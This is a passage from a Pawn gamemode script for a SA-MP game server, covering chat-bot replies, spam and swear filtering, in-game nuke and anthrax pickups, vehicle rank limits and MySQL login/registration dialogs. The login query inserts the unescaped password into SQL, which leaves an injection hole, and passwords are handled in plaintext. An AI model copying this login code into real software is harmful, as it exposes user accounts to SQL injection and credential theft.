	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Global-Admin]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 8)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Community-Manager]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 9)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Community-Co-Owner]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 10)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "{FF4444}%d - [Community-Owner]%s says: {FFFFFF}%s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
    }

    if(ServerInfo[DisableChat] == 1) {
		SendClientMessage(playerid,red,"Chat has been disabled for now!");
	 	return 0;
	}
 	if(PlayerInfo[playerid][Muted] == 1)
	{
 		PlayerInfo[playerid][MuteWarnings]++;
 		new string[128];
		if(PlayerInfo[playerid][MuteWarnings] < ServerInfo[MaxMuteWarnings]) {
			format(string, sizeof(string),"JikyBot: You are muted for now, if you continue to type, you will be kicked. (%d / %d)", PlayerInfo[playerid][MuteWarnings], ServerInfo[MaxMuteWarnings] );
			SendClientMessage(playerid,red,string);
		} else {
			SendClientMessage(playerid,red,"JikyBot: You had been warned! Now you have been kicked!");
			format(string, sizeof(string),"JikyBot: Server has kicked %s (ID %d) (Exceed Mute Warnings)", PlayerName2(playerid), playerid);
			SendClientMessageToAll(grey,string);
			SaveToFile("KickLog",string); Kick(playerid);
		} return 0;
	}
	if(ServerInfo[AntiSpam] == 1 && (PlayerInfo[playerid][Level] == 0 && !IsPlayerAdmin(playerid)) )
	{
		if(PlayerInfo[playerid][SpamCount] == 0) PlayerInfo[playerid][SpamTime] = TimeStamp();

	    PlayerInfo[playerid][SpamCount]++;
		if(TimeStamp() - PlayerInfo[playerid][SpamTime] > SPAM_TIMELIMIT) { // Its OK your messages were far enough apart
			PlayerInfo[playerid][SpamCount] = 0;
			PlayerInfo[playerid][SpamTime] = TimeStamp();
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS) {
			new string[64]; format(string,sizeof(string),"JikyBot: Server has kicked %s (Flood/Spam Protection)", PlayerName2(playerid));
			SendClientMessageToAll(red,string); print(string);
			SaveToFile("KickLog",string);
			Kick(playerid);
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS-1) {
			SendClientMessage(playerid,red,"JikyBot: Anti Spam Warning! Next is a kick.");
			return 0;
		}
	}
	if(ServerInfo[AntiSwear] == 1 && PlayerInfo[playerid][Level] < ServerInfo[MaxAdminLevel])
	for(new s = 0; s < ForbiddenWordCount; s++)
    {
		new pos;
		while((pos = strfind(text,ForbiddenWords[s],true)) != -1) for(new i = pos, j = pos + strlen(ForbiddenWords[s]); i < j; i++) text[i] = '*';
	}

	if(PlayerInfo[playerid][Caps] == 1) UpperToLower(text);
	if(ServerInfo[NoCaps] == 1) UpperToLower(text);

	for(new i = 1; i < MAX_CHAT_LINES-1; i++) Chat[i] = Chat[i+1];
 	new ChatSTR[128]; GetPlayerName(playerid,ChatSTR,sizeof(ChatSTR)); format(ChatSTR,128,"[lchat]%s: %s",ChatSTR, text[0] );
	Chat[MAX_CHAT_LINES-1] = ChatSTR;
//==========Some help texts===========
    if(!strfind(text,"how to launch nuke?",true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Read /Nukehelp to learn how to launch nuke!");
	}
	if(!strfind(text,"how to launch anthrax?",true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Read /Anthraxhelp to learn how to use Anthrax.");
	}
	if(!strfind(text,"Hi all", true) || !strfind(text,"Hi admins", true) || !strfind(text,"Hi everyone", true) || !strfind(text,"Hi guys", true) || !strfind(text,"Hi bot", true) || !strfind(text,"Hi guys", true) && EnableBot == 1) {
	new string[50];
		format(string,sizeof(string),"JikyBot: Hello %s.",GetName(playerid));
	    SendClientMessageToAll(COLOR_PINK,string);
	}
 	if(!strcmp(text, "Fucker", true) || !strcmp(text, "Fuck You", true) || !strcmp(text, "Fuck All", true) || !strcmp(text, "cunt", true) || !strcmp(text, "asshole", true) || !strcmp(text, "Motherfucker", true))
    {
	  new string[128];
	  format(string,sizeof(string),"JikyBot: %s be nice with all players.",PlayerName2(playerid));
	  SendClientMessageToAll(COLOR_PINK,string);
	}
 	if(!strfind(text,"JikyBot", true) && EnableBot == 1) {
		new string[50];
		format(string,sizeof(string),"JikyBot: Yeah %s?",GetName(playerid));
	    SendClientMessageToAll(COLOR_PINK,string);
	}
 	if(!strfind(text,"this noob server", true) || !strfind(text,"noob server", true) && EnableBot == 1) {
	new string[100];
		format(string,sizeof(string),"JikyBot: %s Actually Your the only Noob here.",GetName(playerid));
	    SendClientMessageToAll(COLOR_PINK,string);
	}
	if(!strfind(text,"whassup JikyBot?", true)|| !strfind(text,"Sup JikyBot?", true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Nothing Much.");
	}
	if(!strfind(text,"hack", true) && EnableBot == 1 || strfind(text,"cheater",true) != -1 && EnableBot == 1 || strfind(text,"hacker",true) != -1 && EnableBot == 1) {
	    SendClientMessage(playerid, COLOR_PINK,"JikyBot:: Use /report <ID> <Reason> if you spot any cheaters.");
	}
	if(!strfind(text,"how to see ranks?", true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Type /Ranks for the list of ranks.");
	}
	if(!strfind(text,"how to see my stats?", true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Type /Stats to see your status.");
	}
 	if(!strfind(text,"porn", true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: You idiot dont come here talking shit.");
	}
	if(!strfind(text,"how do I team talk", true) && EnableBot == 1) {
	    SendClientMessageToAll(COLOR_PINK,"JikyBot: Use /R [Text] To talk to Your Team.");
	}
 if(!strcmp(text, "Perfect_Boy you Fucker", true) ||!strcmp(text, "Perfect_Boy u Fucker", true) || !strcmp(text, "You Fucker Perfect_Boy", true) || !strcmp(text, "Fuck You Perfect_Boy", true) || !strcmp(text, "Fuck Perfect_Boy", true) || !strcmp(text, "Perfect_Boy Fuck You", true) || !strcmp(text, "Motherfucker Perfect_Boy", true) || !strcmp(text, "Perfect_Boy Motherfucker", true))
    {
    if(warnmsg[playerid] == 0)
	  {
	   new string[128];
	   format(string,sizeof(string),"JikyBot: %s Dont insult staff or ill take action.",PlayerName2(playerid));
	   SendClientMessageToAll(COLOR_PINK,string);
	   warnmsg[playerid]++;
	  }
	  new str[128];
	   PlayerInfo[playerid][Warnings]++;
       if( PlayerInfo[playerid][Warnings] == MAX_WARNINGS) {
           format(str, sizeof (str), "Administrator \"JikyBot\" has kicked \"%s\".  ( Warning: %d/%d )", PlayerName2(playerid),  PlayerInfo[playerid][Warnings], MAX_WARNINGS);
           SendClientMessageToAll(red, str);
           format(str, sizeof (str), "[ Reason: Insulting Admins ]");
		   SendClientMessageToAll(red, str);
	   	   SaveToFile("KickLog",str);	Kick(playerid);
           return PlayerInfo[playerid][Warnings] = 0;
           } else {
           new str1[128];
           format(str1, 9909, "You Recived a {00F700}Warning{FFFFFF}!\n\n{FFFFFF}From: {FF46FF}JikyBot\n{FFFFFF}Reason: {00F700}Insulting Admins\n{FFFFFF}Warning: {00F700}%d/%d",PlayerInfo[playerid][Warnings], MAX_WARNINGS);
           ShowPlayerDialog(playerid, 13474, DIALOG_STYLE_MSGBOX, "{00F700}WARNING", str1, "Close", "");
           format(str, sizeof (str), "*Administrator \"JikyBot\" has given \"%s\" a warning ( Warning: %d/%d )", PlayerName2(playerid), PlayerInfo[playerid][Warnings], MAX_WARNINGS);
		   SendClientMessageToAll(yellow, str);
           format(str, sizeof (str), "[ Reason: Insulting Admins ]");
           SendClientMessageToAll(yellow, str);
	       Anti_Warn[playerid] = 1;
	       warnmsg[playerid] = 0;
	       Warn[playerid] = playerid;

	      }
	}
	if(!strcmp(text, "noob JikyBot", true) || !strcmp(text, "JikyBot you noob", true) || !strcmp(text, "JikyBot noob", true) || !strcmp(text, "JikyBot what noob", true) || !strcmp(text, "JikyBot you noob", true))
    {
	  if(warnmsg[playerid] == 0)
	  {
	   new string[128];
	   format(string,sizeof(string),"JikyBot: %s Relax or ill take action.",PlayerName2(playerid));
	   SendClientMessageToAll(COLOR_PINK,string);
	   warnmsg[playerid]++;
	  }
           new str[128];
	       PlayerInfo[playerid][Warnings]++;
           if( PlayerInfo[playerid][Warnings] == MAX_WARNINGS) {
           format(str, sizeof (str), "Administrator \"JikyBot\" has kicked \"%s\".  ( Warning: %d/%d )", PlayerName2(playerid),  PlayerInfo[playerid][Warnings], MAX_WARNINGS);
           SendClientMessageToAll(red, str);
           format(str, sizeof (str), "[ Reason: Staff Disrespect ]");
		   SendClientMessageToAll(red, str);
	   	   SaveToFile("KickLog",str);	Kick(playerid);
           return PlayerInfo[playerid][Warnings] = 0;
           } else {
           new str1[128];
           format(str1, 9909, "You Recived a {00F700}Warning{FFFFFF}!\n\n{FFFFFF}From: {FF46FF}JikyBot\n{FFFFFF}Reason: {00F700}Staff Disrespect\n{FFFFFF}Warning: {00F700}%d/%d",PlayerInfo[playerid][Warnings], MAX_WARNINGS);
           ShowPlayerDialog(playerid, 13474, DIALOG_STYLE_MSGBOX, "{00F700}WARNING", str1, "Close", "");
           format(str, sizeof (str), "*Administrator \"JikyBot\" has given \"%s\" a warning ( Warning: %d/%d )", PlayerName2(playerid), PlayerInfo[playerid][Warnings], MAX_WARNINGS);
		   SendClientMessageToAll(yellow, str);
           format(str, sizeof (str), "[ Reason: Staff Disrespect ]");
           SendClientMessageToAll(yellow, str);
	       Anti_Warn[playerid] = 1;
	       warnmsg[playerid] = 0;
	       Warn[playerid] = playerid;
	   }
	   }
    if(PlayerInfo[playerid][dRank] == 1)
	  {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"{FF0000}[DONOR] {FFFF00}%s says: {FFFFFF}%s",aName,text);
	    printf(string2);
	    SendClientMessageToAll(0xF600F6FF,string2);
        return 0;
    }
    if(PlayerInfo[playerid][dRank] == 2)
	  {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"{FF0000}[DONOR] {FFFF00}%s says: {FFFFFF}%s",aName,text);
	    printf(string2);
	    SendClientMessageToAll(0xF600F6FF,string2);
        return 0;
    }
    if(PlayerInfo[playerid][dRank] == 3)
	  {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"{FF0000}[DONOR] {FFFF00}%s says: {FFFFFF}%s",aName,text);
	    printf(string2);
	    SendClientMessageToAll(0xF600F6FF,string2);
        return 0;
    }
    if(gTeam[playerid] == gTeam[playerid])
	  {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"%s[%i] says: %s",aName,playerid,text);
	    printf(string2);
	    SendClientMessageToAll(GetPlayerColor(playerid),string2);
        return 0;
		 }
	if (PlayerInfo[playerid][Hide] == 0)
	{
	if(PlayerInfo[playerid][Level] > 0)
	{
	new str3[256];
	format(str3, 256, "(Admin says): %s", text);
	for(new gz=0;gz<200;gz++)
	if(IsPlayerConnected(gz))
	SendPlayerMessageToPlayer(gz, playerid, str3);
	else SendPlayerMessageToPlayer(gz, playerid, text);
	}
	return 0;
	}
	return 1;
}


public OnPlayerPickUpPickup(playerid, pickupid)
{

	if(pickupid == Pickup[5] || pickupid == Pickup[6] || pickupid == Pickup[7] || pickupid == Pickup[8] || pickupid == Pickup[9] || pickupid == Pickup[10] || pickupid == Pickup[11] || pickupid == Pickup[12] || pickupid == Pickup[13] ||
	   pickupid == Pickup[1] || pickupid == Pickup[2] || pickupid == Pickup[3] || pickupid == Pickup[4])
	{
	    if(pVehicles[playerid] != -1)
	    {
	        foreach(Player, i)
			{
	            if(IsPlayerConnected(i))
	            {
	        		if(IsPlayerInVehicle(i,  pVehicles[playerid])) DestroyVehicle(pVehicles[playerid]);
				}
			}
	    }
	    DestroyVehicle(pVehicles[playerid]);
	    new Float:x, Float:y, Float:z, Float:a;
	    GetPlayerPos(playerid, x, y, z); GetPlayerFacingAngle(playerid, a);
		pVehicles[playerid] = AddStaticVehicle(522, x, y, z, a, -1, -1);
		PutPlayerInVehicle(playerid, pVehicles[playerid], 0);
		return 1;
	}

    if(pickupid == RP && GetPlayerTeam(playerid) != TEAM_SOVIET) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == RP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
    if(pickupid == EP && GetPlayerTeam(playerid) != TEAM_EURASIA) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == EP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
    if(pickupid == AP && GetPlayerTeam(playerid) != TEAM_ARAB) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == AP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
    if(pickupid == A2P && GetPlayerTeam(playerid) != TEAM_AUS) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == A2P) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
    if(pickupid == MP && GetPlayerTeam(playerid) != TEAM_USA) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == MP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
    if(pickupid == VE && GetPlayerTeam(playerid) != TEAM_MARVEL) return SendClientMessage(playerid, 0xFF0000AA, "You can't use other team briefcase.");
    {
    if(pickupid == VE) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour - 5500$\n\nWeapons\nDeathmatch stadium\nRunnies Deathmatch\nBuy License\nMinigun Stadium", "Select", "Cancel");
    }
	{
 }
 if(pickupid == SL)
    {
        if(nuke_time >= 1)
        {
			new String[80];
            format(String, sizeof(String), "Nuke is not ready for launch wait %d seconds.", nuke_time);
            SendClientMessage(playerid, red, String);
            return 1;
        }
        if(tCP[BIG]== gTeam[playerid])
        {
            ShowPlayerDialog(playerid, 991, DIALOG_STYLE_LIST, "Nuke Station (Area 51):", "Usa Base\nEurasia Base\nArabia Base\nSoviet Base\nAustrallia Base\nVietnam Base", "Launch", "Cancel");
		} else SendClientMessage(playerid, RED, "Your team dosn't own Area 51.");
	}
 if(pickupid == SLL)
    {
        if(nuke_time >= 1)
        {
			new String[80];
            format(String, sizeof(String), "Nuke is not ready for launch wait %d seconds.", nuke_time);
            SendClientMessage(playerid, red, String);
            return 1;
        }
        if(tCP[SUBS]== gTeam[playerid])
        {
            ShowPlayerDialog(playerid, 991, DIALOG_STYLE_LIST, "Nuke Station (Submarines):", "Usa Base\nEurasia Base\nArabia Base\nSoviet Base\nAustrallia Base\nVietnam Base", "Launch", "Cancel");
		} else SendClientMessage(playerid, RED, "Your team dosn't own Submarines.");
	}

	if(pickupid == anthraxpickup)
    {
        if(anthrax_time >= 1)
        {
            new String[70];
            format(String, sizeof(String), "Anthrax is not ready for launch wait %d seconds.", anthrax_time);
            SendClientMessage(playerid, red, String);
            return 1;
        }
        if(tCP[EAR] == gTeam[playerid])
        {
            ShowPlayerDialog(playerid, 666, DIALOG_STYLE_MSGBOX, "Anthrax Station (Big Ear):", "Are you sure you want to launch anthrax.\nYou will be charged -400000 $", "Launch", "Cancel");
		} else SendClientMessage(playerid, RED, "Your team dosn't own Big Ear.");
	}
//========================Admin area interior=======================================
	return 1;
}



public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
if(newkeys == KEY_YES)
 	{
 	   new vehicleid = GetPlayerVehicleID(playerid);
       if(IsBomberPatriot(vehicleid))
	   {
		  if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		  {
//			 if(IsPTBAllowed[playerid] == 0) return 0;
             new Float:x, Float:y, Float:z;
             GetVehiclePos(vehicleid, x, y ,z);
             GetXYZInFrontOfVehicle(vehicleid, x, y, z, 35.0);
             CreateExplosion(x, y, z+2, 0, 3);
             IsPTBAllowed[playerid] = 0;
             SetTimerEx("AntiPTBSpam",450,0,"i",playerid);
		  }
		  else return 0;
	  }
       else return 0;
    }
if(newkeys == KEY_YES) // Key Y For Ejecting from the Vehicle Grx4life
         {
new AirCraft = GetVehicleModel(GetPlayerVehicleID(playerid));
	         new Air = GetVehicleModel(GetPlayerVehicleID(playerid));
	         if(AirCraft == 520 || AirCraft == 447 || AirCraft == 425 || AirCraft == 460 || AirCraft == 476 || AirCraft == 487 || AirCraft == 488 || AirCraft == 497 || AirCraft == 511 || AirCraft == 512 ||Air ==513 || Air == 519 || Air == 548 || Air == 553 || Air == 563 || Air == 577 || Air == 592 || Air == 593|| Air == 464|| Air == 539|| Air == 501|| Air == 564|| Air == 594 || Air == 465 || Air == 469 || Air == 441 || Air == 432){
		     new Float:x, Float:y, Float:z; //
             GetPlayerPos(playerid,x,y,z);
	         SetPlayerPos(playerid,x,y,z+120); // SetPlayerPos to variables x and y and z + 70
	         GivePlayerWeapon(playerid, 46 , 1);
        GameTextForPlayer(playerid, "~n~~n~~n~~n~~r~You Have Been ~g~Ejected",2500,3);
		    }
    }

     if(IsPlayerUsingAnims[playerid])
    { StopAnimLoopPlayer(playerid);	}

	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
		if(newkeys == KEY_JUMP) AdvanceSpectate(playerid);
		else if(newkeys == KEY_SPRINT) ReverseSpectate(playerid);
		else if(newkeys == KEY_FIRE) StopSpectate(playerid);
    }
	new Rhinomodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != ENGINEER && PlayerInfo[playerid][OnDuty] != 1 && gClass[playerid] != DONOR) {
			if(Rhinomodel == 432) {
			SendClientMessage(playerid, red, "You Need To Be Rank ENGINEER/DONOR(3) To Drive tanks!");
			RemovePlayerFromVehicle(playerid);
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive tanks!");
			RemovePlayerFromVehicle(playerid);
			}
		}
	}
	if(Rhinomodel == 432)
	{
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive tanks!");
			RemovePlayerFromVehicle(playerid);
			}
	}
	new SEA = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT && gClass[playerid] != SCOUT && PlayerInfo[playerid][OnDuty] != 1 && gClass[playerid] != DONOR) {
		if(SEA == 447) {
			SendClientMessage(playerid, red, "You Need To Be Rank SCOUT/PILOT/DONOR(2) To Drive");
			RemovePlayerFromVehicle(playerid);
		}
    }
	new Hydramodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT && PlayerInfo[playerid][OnDuty] != 1 && gClass[playerid] != DONOR) {
		if(Hydramodel == 520) {
			SendClientMessage(playerid, red, "You Need To Be Rank PILOT/DONOR(3) To Drive hydra!");
			RemovePlayerFromVehicle(playerid);
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive hydra!");
			RemovePlayerFromVehicle(playerid);
			}
	 	}
	}
	if(Hydramodel == 520)
	{
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive tanks!");
			RemovePlayerFromVehicle(playerid);
			}
	}
	new Huntermodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT && PlayerInfo[playerid][OnDuty] != 1 && gClass[playerid] != DONOR) {
		if(Huntermodel == 425) {
			SendClientMessage(playerid, red, "You Need To Be Rank PILOT/DONOR(3) To Drive Hunters!");
			RemovePlayerFromVehicle(playerid);
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive Hunters!");
			RemovePlayerFromVehicle(playerid);
			}
		}
	}
	if(Huntermodel == 425)
	{
			if(License[playerid] == 0 || License[playerid] == 2) {
			SendClientMessage(playerid, red, "You Need To Own A License Read /license To Drive tanks!");
			RemovePlayerFromVehicle(playerid);
			}
	}
	return 1;
}

stock setskin(playerid)
{
if(gTeam[playerid] == TEAM_EURASIA)
	{
	   SetPlayerSkin(playerid, 73);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   SetPlayerSkin(playerid, 285);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
	   SetPlayerSkin(playerid, 179);
	}
	else if(gTeam[playerid] == TEAM_AUS)
	{
	   SetPlayerSkin(playerid, 206);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   SetPlayerSkin(playerid, 287);
	}
	else if(gTeam[playerid] == TEAM_MARVEL)
	{
	   SetPlayerSkin(playerid, 122);
	}
	else if(gTeam[playerid] == TEAM_MERC)
	{
    SetPlayerHealth(playerid, 999999);
    SetPlayerColor(playerid, 0xF600F6FF);
    GivePlayerWeapon(playerid, 38, 999999);
    SetPlayerSkin(playerid, 217);
    }
    return 1;
}

stock GetRankName(playerid)
{
	new str3[64];
	if (GetPlayerScore(playerid) >= 0 && GetPlayerScore(playerid) <= 49) str3 = ("Private - Rank 0");
	if (GetPlayerScore(playerid) >= 50 && GetPlayerScore(playerid) <= 99) str3 = ("Corporal - Rank 1");
	if (GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 499) str3 = ("Lieutenant - Rank 2");
	if (GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 1499) str3 = ("Major - Rank 3");
	if (GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 2499) str3 = ("Captain - Rank 4");
	if (GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999) str3 = ("Commander - Rank 5");
	if (GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 7999) str3 = ("General - Rank 6");
	if (GetPlayerScore(playerid) >= 8000 && GetPlayerScore(playerid) <= 14999) str3 = ("Brigadier - Rank 7");
	if (GetPlayerScore(playerid) >= 15000 && GetPlayerScore(playerid) <= 34999) str3 = ("Field Marshall - Rank 8");
	if (GetPlayerScore(playerid) >= 35000 && GetPlayerScore(playerid) <= 99999) str3 = ("Master of War - Rank 9");
	if (GetPlayerScore(playerid) >= 100000) str3 = ("General of Army - Rank 10");
	return str3;
}
stock GetClass(playerid)
{
	new str[64];
	if(gClass[playerid] == Assault) str = ("Assault");
	else if(gClass[playerid] == SNIPER) str = ("Sniper");
	else if(gClass[playerid] == ENGINEER) str = ("Engineer");
	else if(gClass[playerid] == PILOT) str = ("Pilot");
	else if(gClass[playerid] == JET) str = ("JetTrooper");
	else if(gClass[playerid] == SP) str = ("Support");
	else if(gClass[playerid] == SCOUT) str = ("Scout");
	else if(gClass[playerid] == DONOR) str = ("Donor");
	else if(gClass[playerid] == AG) str = ("Spy");
	return str;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{

if(dialogid == 15000) //If Dialog is our register dialog
{
        if(response) //If they click the button register
        {
            if(!strlen(inputtext) || strlen(inputtext) > 100)  //Password is not 1 to 100 characters
            {
                SendClientMessage(playerid, 0xFF0000, "You must insert a password between 1-100 characters!"); //Sends the client a error message
                ShowPlayerDialog(playerid, 15000, DIALOG_STYLE_INPUT, "Register","Your user is {FF0000}not{FFFFFF} registered! Please {0000FF}register{FFFFFF} with a password below!\n {FF0000}ERROR:Please enter a password between 1-100 characters!","Register","Cancel"); //Shows our register dialog :).
            }
            else if(strlen(inputtext) > 0 && strlen(inputtext) < 100)
            {
                new escpass[100];
                mysql_real_escape_string(inputtext, escpass);
                MySQL_Register(playerid, inputtext);
                buggy[playerid] = 0;
            }
            //If the password is between 1 and 100 characters then we will
            //call our MySQL_register function which will register the player.
        }
        if(!response)
        {
                SendClientMessage(playerid, 0xFF0000, "You must register before logging in!"); //Sends the client a error message
                ShowPlayerDialog(playerid, 15000, DIALOG_STYLE_INPUT, "Register","Your user is {FF0000}not{FFFFFF} registered! Please {0000FF}register{FFFFFF} with a password below!\n {FF0000}ERROR:Please enter a password !","Register","Cancel"); //Shows our register dialog :).
        }
}
if(dialogid == 15500) //Dialog login
{
        if(!response) //If they click the cancel button
        {
                SendClientMessage(playerid, 0xFF0000, "You must login before you spawn!"); //Sends the client a error message
                ShowPlayerDialog(playerid, 15500, DIALOG_STYLE_INPUT, "Login","Your user is {FF0000}registered{FFFFFF}! Please {0000FF}login{FFFFFF} with your password below!\n{FF0000} You must login before you spawn!","Login","Cancel"); //Shows our login dialog :).
        }
        if(response) //If the player clicked login
        {
            new query[200], pname[24], escapepass[100]; //
            GetPlayerName(playerid, pname, 24); //Gets the players name
            mysql_real_escape_string(inputtext, escapepass); //We escape the inputtext to avoid SQL injections.
            format(query, sizeof(query), "SELECT `Name` FROM Accounts WHERE Name = '%s' AND password = '%s'", pname, inputtext);
            mysql_query(query);
            mysql_store_result();
            new numrows = mysql_num_rows();
            buggy[playerid] = 0;
            if(numrows == 1) MySQL_Login(playerid);
            //This means that there is a user in the database with the same
            //password that we typed, we now proceed by using the login function.
            if(!numrows)
            {
                //This means that the password that the player
                //typed was incorrect and we will resend the dialog.
                ShowPlayerDialog(playerid, 15500, DIALOG_STYLE_INPUT, "Login","Your user is {FF0000}registered{FFFFFF}! Please {0000FF}login{FFFFFF} with your password below!\n{FF0000} The password you typed was incorrect!","Login","Cancel"); //Shows our login dialog :).
                SendClientMessage(playerid, 0xFF0000, "Incorrect password!"); //Sends the client a error message
            }
            mysql_free_result(); //Remember to always free a result if you stored one!
        }
}
if(strfind(inputtext,"%",true) != -1) return SendClientMessage(playerid, RED," ");
if(dialogid == CLASS_DIALOG)
{
   	if(!response)
   	{
		new String[150];
		new team1count = GetTeamCount(TEAM_EURASIA);
    	new team2count = GetTeamCount(TEAM_USA);
    	new team3count = GetTeamCount(TEAM_ARAB);
    	new team4count = GetTeamCount(TEAM_SOVIET);
    	new team5count = GetTeamCount(TEAM_AUS);
		format(String, sizeof(String),""cblue"Usa [P:%d]\n"cgreen"Eurasia [P:%d]\n"cyellow"Arabica [P:%d]\n"cred"Soviet [P:%d]\n"cpurple"Austraillia [P:%d]",team2count, team1count, team3count, team4count, team5count);
		ShowPlayerDialog(playerid, 1432, DIALOG_STYLE_LIST, "Select Team",String,"Select","Back");
   	}
   	else if(response)
   	{
	   switch(listitem)
	   {
		   case 0:
		   {
				gClass[playerid] = Assault;
			   	SendClientMessage(playerid, -1,"You have chosen the Assault class");
			   	SendClientMessage(playerid, -1,"BONUS: No extra bonus with this class");
			   	SpawnPlayer(playerid);
			   	UpdateLabelText(playerid);
		   }
		   case 1:
		   {
				gClass[playerid] = SNIPER;
				SendClientMessage(playerid, -1,"You have chosen the Sniper class");
				SendClientMessage(playerid, -1,"BONUS: Invisible on map");
				SpawnPlayer(playerid);
				UpdateLabelText(playerid);
		   }
		   case 2:
		   {
                if(GetPlayerScore(playerid) >= 8000)
                {
				   	gClass[playerid] = PILOT;
				   	SendClientMessage(playerid, -1,"You have chosen Pilot class");
				   	SendClientMessage(playerid, -1,"BONUS: Can fly heavy air vehicles");
				   	SpawnPlayer(playerid);
				   	UpdateLabelText(playerid);
				}
